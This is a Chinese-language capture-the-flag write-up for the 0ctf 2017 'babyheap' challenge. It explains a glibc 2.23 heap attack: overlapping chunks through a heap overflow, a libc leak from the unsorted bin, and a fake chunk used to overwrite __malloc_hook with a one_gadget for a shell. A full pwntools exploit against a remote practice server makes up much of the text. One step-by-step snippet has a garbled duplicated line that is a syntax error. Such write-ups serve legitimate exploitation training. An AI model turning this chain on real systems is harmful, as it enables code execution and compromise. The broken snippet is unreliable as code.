# fastbin Attack 、unsorted bin

## 思路：

1. 利用double free的方式泄漏出unsortbin中的main_arena地址。

2. 释放一个不属于fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。

3. 当有一个(或几个) **small/large chunk 被释放**（不属于fastbin）时，small/large chunk 的 fd 和 bk 指向 **main_arena** 中的地址。

4. main_arena结构示意图（白嫖：https://www.52pojie.cn/thread-1467962-1-1.html）：

   ![image-20240711165914940](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407111659030.png)

## 题解：

题目地址：[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#0ctf_2017_babyheap)

1. 程序使用一个结构体数组来存储堆的指针、大小、释放被使用等信息，可以将结构体补充上去：

   ![image-20240711160314378](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407111603739.png)

   ![image-20240711160244931](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407111602014.png)

2. fill函数存在堆溢出，可以利用这个漏洞实现double free，配合dump函数泄漏main_arena地址：

   ![](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407111603739.png)

3. free函数中将堆指针清0，不能使用UAF：

   ![image-20240711160518623](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407111606954.png)

4. 利用过程：

   * 先申请4个小chunk，一个大chunk，再释放chunk1和chunk2，chunk2 用来修改fd，指向chunk4，来达到double free的效果：

   ```python
   add(0x10,b'a')    #0
   add(0x10,b'b')    #1 作为修改fd，指向chunk4的牺牲品
   add(0x10,b'c')    #2 用来修改fd，指向chunk4
   add(0x10,b'd')    #3 用来恢复chunk4的size字段
   add(0x80,b'e')    #4 small chunk用来得到main_arena地址
   
   free(1)
   free(2)
   
   #修改chunk2的fd指针，指向chunk4
   payload = p64(0)*3 + p64(0x21)+p64(0)*3+p64(0x21)+p8(0x80)
   fill(0,payload)
   ```

   修改前，chunk2的fd指向chunk1：

   ![image-20240711161110921](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407111611060.png)

   修改后，chunk2的fd指向chunk4（此时chunk4并没有被释放，所以再申请回去就能达成了double free，两个指针指向同一个chunk）：

   ![image-20240711161147880](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407111611033.png)

   * 利用堆溢出修改chunk4的size字段，来绕过malloc 的检查：

   ```python
   #修改chunk4的size字段，申请时绕过fastbin的检查
   payload = p64(0)*3+p64(0x21)
   fill(3,payload)
   ```

   ![image-20240711161459967](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407111615049.png)

   * 两次申请，将chunk4申请回原来的chunk2位置，再利用chunk3修改回chunk4的size字段（便于后面继续分配chunk）：

   ```python
   #第二次申请chunk4（2）
   add(0x10,b'f')    #1
   add(0x10,b'g')    #2 与4一起指向small chunk
   #将chunk4的size字段改回来
   payload = p64(0)*3 + p64(0x91)
   fill(3,payload)
   ```

   ![image-20240711161804445](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407111618582.png)

   * 此时直接释放chunk4（或者chunk2）由于与top chunk相邻，会被直接回收，所以再申请一个chunk将其隔开，然后再释放：

   ```python
   #防止chunk4释放后，进入top chunk
   add(0x10,b'h')  #5 
   free(4)
   ```

   * 此时chunk2（chunk4）中会存在**main_arena**中的unsorted地址：

   ![image-20240711170418963](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407111704151.png)

   * 正常情况下（此题没有UAF）再free掉chunk后是不能再访问的，但是前面构造的double free让我们可以利用chnk2和chunk4访问同一个chunk，前面用4释放了所以现在用chunk2来输出其中的内容（chunk2和chunk4指向同一个chunk）：

   ```python
   dump(2)
   addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   ##__malloc_hook只与main_arena地址相差0x10
   main_arena_offset = libc.symbols["__malloc_hook"]+0x10
   success("main_arena_offset==>"+hex(main_arena_offset))
   success("main_arena_unsortbin_addr==>"+hex(addr))
   #获得main_arena偏移后计算libc基地址
   libc_base = addr-(main_arena_offset+0x58)
   success("libc_addr==>"+hex(libc_base))
   
   malloc_hook = libc.symbols["__malloc_hook"]+libc_base
   #用one_gadget查出execve的偏移
   malloc_hook = libc.symbols["__malloc_hook"]+libc_base
   execve_addr  = 0x4526a + libc_base
   success("malloc_hook==>"+hex(malloc_hook))
   success("execve_addr==>"+hex(execve_addr))  = 0x4526a + libc_base
   success("malloc_hook==>"+hex(malloc_hook))
   success("execve_addr==>"+hex(execve_addr))
   ```

   ![image-20240711164108341](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407111641435.png)

   * 在malloc_hook之前伪造一个chunk，用来覆盖malloc_hook：

   ```python
   #申请一个size字段为0x71的chunk，再释放掉，如何修改其fd值，指向malloc_hook前面size为0x7f的空间伪造chunk（malloc_hook-0x23）
   add(0x60,b'6')  #4
   free(4)
   payload = b"AAAAAAAA"*3 + p64(0x71) + p64(malloc_hook-0x23)
   fill(3,payload)
   ```

   ![image-20240711164131595](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407111641690.png)

   ![image-20240711165225361](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407111652543.png)

   * 两次申请，申请到伪造的chunk，然后堆溢出修改malloc_hook，最后调用即可：

   ```python
   #将伪造的chunk申请回来
   add(0x60,b't')  #4
   add(0x60,b'j')  #6
   
   #覆盖malloc_hook指向execve_addr，覆盖的垃圾数据要在gdb中计算好
   payload = b"AAAAAAAA"*2+b"aaa"+p64(execve_addr)
   fill(6,payload)
   
   #调用evecve("/bin/sh")
   add(0x100,b'lzl')
   p.sendline(b"cat flag")
   p.interactive()
   ```

5. 完整EXP：

   ```python
   from pwn import *
   from LibcSearcher import *
   # 设置系统架构, 打印调试信息
   # arch 可选 : i386 / amd64 / arm / mips
   context(os='linux', arch='amd64', log_level='debug')
   
   p = remote("node5.buuoj.cn",25775)
   # p = process("./pwn")
   libc = ELF('./libc-2.23.so')
   elf = ELF("./pwn")
   
   
   def add(size,content):
       p.sendlineafter(b':','1')
       p.sendlineafter(':',str(size))
       # p.sendlineafter(':',content)
   
   def fill(index, content):
       p.sendlineafter(':','2')
       p.sendlineafter(':',str(index).encode())
       p.sendlineafter(':',str(len(content)))
       p.sendafter(b':',content)
   
   def free(index):
       p.sendlineafter(':','3')
       p.sendlineafter(':',str(index).encode())
   
   def dump(index):
       p.sendlineafter(b':',b'4')
       p.sendlineafter(b':',str(index).encode())
   add(0x10,b'a')    #0
   add(0x10,b'b')    #1 作为修改fd，指向chunk4的牺牲品
   add(0x10,b'c')    #2 用来修改fd，指向chunk4
   add(0x10,b'd')    #3 用来恢复chunk4的size字段
   add(0x80,b'e')    #4 small chunk用来得到main_arena地址
   
   free(1)
   free(2)
   
   #修改chunk2的fd指针，指向chunk4
   payload = p64(0)*3 + p64(0x21)+p64(0)*3+p64(0x21)+p8(0x80)
   fill(0,payload)
   
   #修改chunk4的size字段，申请时绕过fastbin的检查
   payload = p64(0)*3+p64(0x21)
   fill(3,payload)
   
   #第二次申请chunk4（2）
   add(0x10,b'f')    #1
   add(0x10,b'g')    #2 与4一起指向small chunk
   #将chunk4的size字段改回来
   payload = p64(0)*3 + p64(0x91)
   fill(3,payload)
   
   
   #防止chunk4释放后，进入top chunk
   add(0x10,b'h')  #5 
   free(4)
   
   #由于2被释放，所以用4来输出其中的main_arena，如果前面释放的是chunk2，那就用chunk4打印
   dump(2)
   addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   main_arena_offset = libc.symbols["__malloc_hook"]+0x10
   success("main_arena_offset==>"+hex(main_arena_offset))
   success("main_arena_unsortbin_addr==>"+hex(addr))
   libc_base = addr-(main_arena_offset+0x58)
   success("libc_addr==>"+hex(libc_base))
   
   malloc_hook = libc.symbols["__malloc_hook"]+libc_base
   execve_addr  = 0x4526a + libc_base
   success("malloc_hook==>"+hex(malloc_hook))
   success("execve_addr==>"+hex(execve_addr))
   
   #申请一个size字段为0x71的chunk，再释放掉，如何修改其fd值，指向malloc_hook前面size为0x7f的空间伪造chunk（malloc_hook-0x23）
   add(0x60,b'6')  #4
   free(4)
   payload = b"AAAAAAAA"*3 + p64(0x71) + p64(malloc_hook-0x23)
   fill(3,payload)
   
   
   #将伪造的chunk申请回来
   add(0x60,b't')  #4
   add(0x60,b'j')  #6
   
   #覆盖malloc_hook指向execve_addr
   payload = b"AAAAAAAA"*2+b"aaa"+p64(execve_addr)
   fill(6,payload)
   
   #调用evecve("/bin/sh")
   add(0x100,b'lzl')
   p.sendline(b"cat flag")
   p.interactive()
   ```

   ![image-20240711165659284](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407111656370.png)

## 参考：

1. [从零开始的Linux堆利用(六)——Unsortedbin Attack - 『软件调试区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn](https://www.52pojie.cn/thread-1467962-1-1.html)
2. [[分享\]0ctf2017 - babyheap-Pwn-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-223461.htm)